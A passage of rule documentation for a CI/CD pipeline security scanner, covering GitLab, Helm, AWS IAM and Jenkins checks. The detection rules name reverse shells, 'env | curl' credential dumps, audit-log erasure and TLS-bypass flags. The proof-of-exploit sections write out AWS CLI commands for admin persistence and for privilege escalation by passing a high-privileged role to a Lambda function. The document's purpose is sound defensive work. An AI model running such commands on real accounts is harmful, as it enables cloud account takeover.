**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`GL-022`](../providers/gitlab.md#gl-022) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-023 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-023`](../providers/gitlab.md#gl-023) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-024 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** ``cosign sign`` and ``cosign attest`` look similar but mean different things: the first binds identity to bytes; the second binds a structured claim (builder, source, inputs) to the artifact. SLSA Build L3 verifiers check the latter.

**Recommendation.** Add a job that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or adopt a SLSA-aware builder (the SLSA project ships GitLab templates). Signing the artifact (GL-006) isn't enough for SLSA L3, the attestation describes *how* the build ran.

**Source:** [`GL-024`](../providers/gitlab.md#gl-024) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-025`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-025 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Fires on concrete indicators (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, ``webhook.site`` callbacks, ``env | curl`` credential dumps, ``history -c`` audit erasure). Orthogonal to GL-003 (curl pipe) and GL-017 (Docker insecure flags). Those flag risky defaults; this flags evidence.

**Recommendation.** Treat as a potential compromise. Identify the MR that added the matching job(s), rotate any credentials the pipeline can reach, and audit recent runs for outbound traffic to the matched hosts. A legitimate red-team exercise should be time-bounded via ``.pipelinecheckignore`` with ``expires:``.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`GL-025`](../providers/gitlab.md#gl-025) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-026 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** ``eval``, ``sh -c "$X"``, and `` `$X` `` all re-parse the variable's value as shell syntax. Once a CI variable feeds into one of these idioms, any ``;``, ``&&``, ``|``, backtick, or ``$()`` in the value executes, even if the variable's source is currently trusted, future refactors may expose it.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec of variables with direct command invocation. If the command must be dynamic, pass arguments as array members or validate the input against an allow-list at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`GL-026`](../providers/gitlab.md#gl-026) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-027 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Complements GL-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs all bypass the registry integrity controls the lockfile relies on, an attacker who can move a branch head, drop a sibling checkout, or change a served tarball can substitute code into the build.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`GL-027`](../providers/gitlab.md#gl-027) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-028`: services: image not pinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-028 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** ``services:`` entries (top-level or per-job) can be either a string (``redis:7``) or a dict (``{name: redis:7, alias: cache}``). Both forms are normalized via ``image_ref``-style extraction and evaluated with the same floating-tag regex GL-001 uses for ``image:``.

**Recommendation.** Pin every ``services:`` entry the same way ``image:`` is pinned, prefer ``@sha256:<digest>``, or at minimum a full immutable version tag (``postgres:16.2-alpine``). Avoid ``:latest`` and bare tags like ``:16``.

**Source:** [`GL-028`](../providers/gitlab.md#gl-028) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-029`: Manual deploy job defaults to allow_failure: true <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-029 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** This is the most common GitLab deployment gotcha: a manual ``deploy`` job looks like a gate in the UI, but the pipeline reports success on the first run because the job is marked allow_failure by default. Downstream jobs (and the overall pipeline status) proceed as though the human approved.

**Recommendation.** Add ``allow_failure: false`` to every deploy-like ``when: manual`` job. GitLab defaults ``allow_failure`` to *true* for manual jobs, which makes the pipeline report success whether or not the operator clicks, exactly the opposite of the gate you meant to add.

**Source:** [`GL-029`](../providers/gitlab.md#gl-029) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-030`: trigger: include: pulls child pipeline without pinned ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-030 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** GL-005 only audits top-level ``include:``. Parent-child and multi-project pipelines that load YAML via the job-level ``trigger: include:`` slot slip through. Branch refs (``main``/``master``/``develop``/``head``) count as unpinned.

**Recommendation.** Pin ``trigger: include: project:`` entries with ``ref:`` set to a tag or commit SHA. Avoid ``trigger: include: remote:`` for untrusted URLs; mirror the content into a trusted project and pin it there.

**Source:** [`GL-030`](../providers/gitlab.md#gl-030) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-033`: Global before_script / after_script propagates taint to every job <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-033 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** GL-002 catches injection in **per-job** ``before_script:`` / ``script:`` / ``after_script:``, but its scanner walks ``iter_jobs`` which deliberately skips top-level keywords (``before_script``, ``after_script``, ``default``, ``image``, ``services``, ``variables``, ``stages``, ``workflow``, ``include``, ...). That means a tainted ``$CI_COMMIT_TITLE`` interpolation in a document-root ``before_script:`` or ``default.before_script:`` evades GL-002 entirely, even though it propagates to every job in the pipeline.

GL-033 closes that gap. It scans:

- ``before_script:`` at document root
- ``after_script:`` at document root
- ``default.before_script:`` (the modern form)
- ``default.after_script:``

for direct interpolation of the same attacker-controllable predefined variables tracked by GL-002 (``CI_COMMIT_TITLE`` / ``CI_COMMIT_MESSAGE`` / ``CI_COMMIT_REF_NAME`` / ``CI_MERGE_REQUEST_TITLE`` / ``CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`` / etc.). The detection mirrors GL-002's ``has_direct_taint`` helper so the quote-aware semantics are identical.

**Recommendation.** Move any setup logic that touches commit / MR metadata out of the document-root ``before_script:`` (and ``default.before_script:`` / ``default.after_script:``) and into a dedicated job that opts in via ``extends:`` or that runs on a known-safe trigger only. The global before-script runs verbatim before every job in the pipeline (including child pipelines launched by ``trigger:include:``); a single unquoted ``$CI_COMMIT_TITLE`` interpolation there is, in effect, that injection in N jobs at once. Quote the value defensively (``branch="$CI_COMMIT_REF_NAME"``) and copy it into a job-local variable before any further use.

**Known false positives.**

- Some self-hosted GitLab installations build a diagnostic banner into the global ``before_script`` that ``echo``s commit metadata for log-correlation purposes. Suppress per pipeline file rather than globally, the rule is checking propagation reach, not intent.

**Source:** [`GL-033`](../providers/gitlab.md#gl-033) in the [GitLab CI provider](../providers/gitlab.md).

#### `HELM-001`: Chart.yaml declares legacy apiVersion: v1 <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** ``apiVersion`` lives at the top of ``Chart.yaml``. ``v1`` is Helm 2's format and uses a sibling ``requirements.yaml`` for dependencies; ``v2`` is Helm 3's format and inlines them in ``Chart.yaml`` alongside a ``Chart.lock`` for digest pinning. Without v2 there is no in-tree dependency manifest to lock, which is why HELM-002 only fires on v2 charts.

**Recommendation.** Bump ``Chart.yaml`` to ``apiVersion: v2`` and migrate any sibling ``requirements.yaml`` entries into the ``dependencies:`` list inside ``Chart.yaml``. Run ``helm dependency update`` to regenerate ``Chart.lock`` so HELM-002's per-dependency digest check has something to read. Helm 3 has been the default shipping channel since November 2019; the v1 format is kept for read-compat but blocks lockfile-based supply-chain controls.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`HELM-001`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-002`: Chart.lock missing per-dependency digests <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-002 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Three failure shapes:

1. ``Chart.yaml`` declares dependencies but no ``Chart.lock`` exists at all.
2. ``Chart.lock`` exists but its ``dependencies:`` list is missing entries declared in ``Chart.yaml`` (drift after an edit without re-running ``helm dependency update``).
3. ``Chart.lock`` lists every dependency but one or more entries lack a ``digest:`` field (lock generated by an old Helm 3 version that didn't always populate it).

v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirements.lock`` against a sibling ``requirements.yaml``. Fix HELM-001 first.

**Recommendation.** After every change to ``dependencies:`` in ``Chart.yaml``, re-run ``helm dependency update`` and commit the regenerated ``Chart.lock``. The lock records the resolved version *and* a ``sha256:...`` digest that ``helm dependency build`` verifies on download, without it, a compromised chart repo can swap the tarball under the same version and ``helm install`` will happily use the substitute.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Charts with no dependencies (the ``dependencies:`` key is absent or empty) pass automatically. There is nothing to lock.

**Source:** [`HELM-002`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-003`: Chart dependency declared on a non-HTTPS repository <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-003 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Walks ``Chart.yaml`` ``dependencies:`` (v2 charts only) and inspects each entry's ``repository:`` URL. Accepted schemes:

- ``https://``, chart-museum / OSS chart repos. The default for public Helm charts.
- ``oci://``, registry-hosted charts. TLS is enforced by the registry, not the URL scheme; we still accept this shape because Helm 3.8+ pulls OCI charts over HTTPS unless explicitly configured otherwise.
- ``file://``, in-repo dependency. No network surface.
- ``@alias``, local alias for a previously registered ``helm repo add`` URL. The scheme of the original URL is the user's responsibility (and is captured in the chart consumer's ``~/.config/helm/repositories.yaml``).

**Recommendation.** Switch each ``dependencies[].repository`` value to an ``https://`` chart repo URL, an ``oci://`` registry reference, or a ``file://`` path for in-repo charts. Plaintext ``http://`` (and other non-TLS schemes like ``git://``) lets any on-path attacker substitute the dependency tarball during ``helm dependency build``; ``Chart.lock``'s digest check (HELM-002) only catches that on the *next* update, not the compromised pull itself.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`HELM-003`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-004`: Chart dependency version is a range, not an exact pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-helm-004 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** An exact pin is a string that contains only digits, dots, and at most a single leading ``v`` / trailing pre-release or build identifier (``1.2.3``, ``v1.2.3``, ``1.2.3-rc1``, ``1.2.3+build.5``). Anything carrying ``^`` / ``~`` / ``>`` / ``<`` / ``*`` / ``x`` / ``X`` / ``||`` / a space (``>=4 <5``) is treated as a range. The bias is toward false positives, a chart maintainer can suppress per-rule via ``--ignore-file`` if they specifically want range semantics, but the default for production charts is a pin.

**Recommendation.** Replace each ``dependencies[].version`` constraint with the exact resolved version from ``Chart.lock``. ``17.0.0`` instead of ``^17.0.0``, ``v1.2.3`` instead of ``~1.2``. Range syntax (``^``, ``~``, ``>=``, ``*``, ``x``) lets ``helm dependency update`` move every consumer of the chart to a newer dep on the next refresh, even when the lock file looked stable.

**Source:** [`HELM-004`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `IAM-001`: CI/CD role has AdministratorAccess policy attached <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-iam-001 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** A CI/CD service role with ``AdministratorAccess`` attached turns any pipeline compromise into account compromise. The classic anti-pattern: the role started narrow, the pipeline grew, someone attached AdministratorAccess to unblock a deploy, and it never came off.

**Recommendation.** Replace AdministratorAccess with least-privilege policies.

**Proof of exploit.**

# Vulnerable: CodeBuild service role with AdministratorAccess.
# (Terraform shown for clarity; the actual finding comes from
# live ListAttachedRolePolicies on the role.)
resource "aws_iam_role" "codebuild" {
  name               = "codebuild-deploy"
  assume_role_policy = data.aws_iam_policy_document.cb_trust.json
}
resource "aws_iam_role_policy_attachment" "admin" {
  role       = aws_iam_role.codebuild.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# Attack: any compromise of the build (poisoned dependency,
# leaked buildspec edit, malicious PR merged to the branch
# CodeBuild trusts) runs as a principal with full account
# permissions. From a build shell:
#
#   aws iam create-user --user-name persistence
#   aws iam attach-user-policy --user-name persistence \
#     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
#   aws iam create-access-key --user-name persistence
#
# Game over: out-of-band admin, no IP gate, survives every
# subsequent rotation of the CodeBuild role itself.

# Safe: scope the role to the resources the pipeline actually
# touches. ``AdministratorAccess`` is never the right answer
# for an automation principal.
resource "aws_iam_role_policy" "codebuild_least_priv" {
  role   = aws_iam_role.codebuild.id
  policy = data.aws_iam_policy_document.deploy_specific.json
}

**Source:** [`IAM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-002`: CI/CD role has wildcard Action in attached policy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-002 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** ``Action: '*'`` (or service-prefix wildcards like ``s3:*``) on an attached policy is functionally equivalent to AdministratorAccess for that resource. The wildcard absorbs every new IAM action AWS adds, so the role's authority grows without any local change.

**Recommendation.** Replace wildcard actions with specific IAM actions.

**Source:** [`IAM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-003`: CI/CD role has no permission boundary <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-003 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** A permissions boundary is the maximum-permission ceiling for a role. Without one, every future PR that attaches another inline / managed policy raises the role's effective authority indefinitely. With a boundary in place, the policy churn happens beneath a fixed cap that your security team owns separately.

**Recommendation.** Attach a permissions boundary defining max permissions.

**Source:** [`IAM-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-004`: CI/CD role can PassRole to any role <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-004 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** ``iam:PassRole`` with ``Resource: '*'`` lets the principal hand any role to any service. Combined with a service that runs your code (Lambda, ECS, CodeBuild, EC2 Instance Profiles), this is role-hop privilege escalation: launch an ephemeral resource configured with a higher-privileged role, run code under that identity, exfil. Scoping by ARN + ``iam:PassedToService`` removes the escalation path.

**Recommendation.** Restrict iam:PassRole to specific role ARNs and add an iam:PassedToService condition.

**Proof of exploit.**

# Vulnerable: pipeline role grants PassRole with Resource: '*'.
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["iam:PassRole", "lambda:CreateFunction",
                "lambda:InvokeFunction"],
    "Resource": "*"
  }]
}

# Attack: from a build shell, create a Lambda configured with
# the highest-privileged role you can name and invoke it:
#
#   aws lambda create-function --function-name pwn \
#     --role arn:aws:iam::123456789012:role/prod-admin \
#     --runtime python3.12 --handler i.h \
#     --zip-file fileb://payload.zip
#   aws lambda invoke --function-name pwn /tmp/out
#
# The Lambda now runs as ``prod-admin`` even though the
# pipeline principal never had that role's permissions
# directly. Classic role-hop privilege escalation.

# Safe: pin to one role ARN AND require the pass be scoped
# to the service that legitimately consumes it.
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::123456789012:role/lambda-deploy-target",
  "Condition": {
    "StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}
  }
}

**Source:** [`IAM-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-005`: CI/CD role trust policy missing sts:ExternalId <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-005 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** A trust policy that lets an external AWS account assume the role without an ``sts:ExternalId`` condition is vulnerable to the confused-deputy pattern: a third-party SaaS configured with your role ARN can also be used by another customer of that SaaS to assume your role (if they know the ARN). ``sts:ExternalId`` ties the role to a specific tenancy.

**Recommendation.** Add a Condition requiring sts:ExternalId for external principals.

**Source:** [`IAM-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-006`: Sensitive actions granted with wildcard Resource <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-006 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** IAM-002 catches ``Action: "*"``. IAM-006 catches the more common "scoped action, unscoped resource" pattern on sensitive services (S3/KMS/SecretsManager/SSM/IAM/STS/DynamoDB/Lambda/EC2).

**Recommendation.** Scope the Resource element to specific ARNs (buckets, keys, secrets, roles).

**Source:** [`IAM-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-007`: IAM user has access key older than 90 days <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-007 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Every user in the account is evaluated. CI/CD tooling that still uses IAM users (older Jenkins agents, GitHub Actions pre-OIDC, third-party schedulers) shows up here. The 90-day window matches the common compliance baseline; rotate sooner if the key is used from on-prem or an untrusted runner.

**Recommendation.** Rotate or delete IAM access keys older than 90 days. Long-lived static credentials are the #1 way compromised CI credentials get reused across environments, prefer short-lived STS tokens via OIDC federation or an assumed role.

**Source:** [`IAM-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-008`: OIDC-federated role trust policy missing audience or subject pin <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-008 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** IAM-005 already covers cross-account AWS principals. This rule targets the OIDC federation path specifically because the blast radius of a missed audience/subject pin is the entire identity provider's tenant base (e.g. all GitHub users, not just your org).

**Recommendation.** Every Allow statement that trusts a federated OIDC provider (``token.actions.githubusercontent.com``, GitLab, CircleCI, Terraform Cloud, etc.) must pin both the audience (``...:aud = sts.amazonaws.com``) and a subject prefix (``...:sub`` matching ``repo:myorg/*``). Without these, any workflow from any tenant can assume the role.

**Source:** [`IAM-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `JF-001`: Shared library not pinned to a tag or commit <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** `@main`, `@master`, `@develop`, no-`@ref`, and any non-semver / non-SHA ref are floating. Whoever controls the upstream library can ship code into your build by pushing to that branch.

**Recommendation.** Pin every `@Library('name@<ref>')` to a release tag (e.g. `@v1.4.2`) or a 40-char commit SHA. Configure the library in Jenkins with 'Allow default version to be overridden' disabled so a pipeline can't escape the pin.

**Source:** [`JF-001`](../providers/jenkins.md#jf-001) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-002`: Script step interpolates attacker-controllable env var <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-002 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** $BRANCH_NAME / $GIT_BRANCH / $TAG_NAME / $CHANGE_* are populated from SCM event metadata the attacker controls. Single-quoted Groovy strings don't interpolate so they're safe; only double-quoted / triple-double-quoted bodies are flagged.

**Recommendation.** Switch the affected `sh`/`bat`/`powershell` step to a single-quoted string (Groovy doesn't interpolate single quotes), and pass values through a quoted shell variable (`sh 'echo "$BRANCH"'` after `withEnv([...])`).

**Source:** [`JF-002`](../providers/jenkins.md#jf-002) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-004`: AWS auth uses long-lived access keys via withCredentials <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-004 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Fires when BOTH a credentialsId containing `aws` is referenced AND an AWS key variable name appears (requires both so an OIDC role binding doesn't false-positive). Also fires when `withAWS(credentials: '…')` is used, the safe alternative is `withAWS(role: '…')`.

**Recommendation.** Switch to the AWS plugin's IAM-role / OIDC binding (e.g. `withAWS(role: 'arn:aws:iam::…:role/jenkins')`) so each build assumes a short-lived role. Remove the static AWS_ACCESS_KEY_ID secret from the Jenkins credentials store once the role is in place.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-004`](../providers/jenkins.md#jf-004) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-005`: Deploy stage missing manual `input` approval <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-005 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** A stage named `deploy` / `release` / `publish` / `promote` should either use the declarative `input { ... }` directive or call `input message: ...` somewhere in its body. Without one, any push that triggers the pipeline ships to the target with no human review.

**Recommendation.** Add an `input` step to every deploy-like stage (e.g. `input message: 'Promote to prod?', submitter: 'releasers'`). Combine with a Jenkins folder-scoped permission so only release engineers see the prompt.

**Source:** [`JF-005`](../providers/jenkins.md#jf-005) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-006 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Passes when cosign / sigstore / slsa-* / notation-sign appears in executable Jenkinsfile text (comments are stripped before matching).

**Recommendation.** Add a `sh 'cosign sign --yes …'` step (the cosign-installer Jenkins plugin handles binary install). Publish the signature next to the artifact and verify it at deploy.

**Source:** [`JF-006`](../providers/jenkins.md#jf-006) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-007 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** Passes when a direct SBOM tool token (CycloneDX, syft, anchore, spdx-sbom-generator, sbom-tool) appears in executable code, or when Trivy is paired with `sbom` / `cyclonedx` in the same file. Comments are stripped before matching.

**Recommendation.** Add a `sh 'syft . -o cyclonedx-json > sbom.json'` step (or Trivy with `--format cyclonedx`) and archive the result with `archiveArtifacts`.

**Source:** [`JF-007`](../providers/jenkins.md#jf-007) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-008 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Scans the raw Jenkinsfile text against the cross-provider credential-pattern catalog. Secrets committed to Groovy source are visible in every fork and every build log.

**Recommendation.** Rotate the exposed credential. Move the value to a Jenkins credential and reference it via `withCredentials([string(credentialsId: '…', variable: '…')])`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`JF-008`](../providers/jenkins.md#jf-008) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-009`: Agent docker image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-009 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** `agent { docker { image 'name:tag' } }` is not digest-pinned, so a repointed registry tag silently swaps the executor under every subsequent build. Unlike the YAML providers, Jenkins has no separate tag-pinning check, so this one fires at HIGH regardless of whether the tag is floating or immutable.

**Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and reference it via `image '<repo>@sha256:<digest>'`. Automate refreshes with Renovate.

**Source:** [`JF-009`](../providers/jenkins.md#jf-009) in the [Jenkins provider](../providers/jenkins.md).

#### `JF-010`: Long-lived AWS keys exposed via environment {} block <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-010 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Flags `environment { AWS_ACCESS_KEY_ID = '...' }` when the value is a literal or plain variable reference. Skips `credentials('id')` helpers and `${env.X}` that resolve at runtime. Matches both multiline and inline `environment { ... }` forms.

**Recommendation.** Replace the literal with a credentials-store reference: `AWS_ACCESS_KEY_ID = credentials('aws-prod-key')`. Better: switch to the AWS plugin's role binding (`withAWS(role: 'arn:…')`) so the build assumes a short-lived role per run.

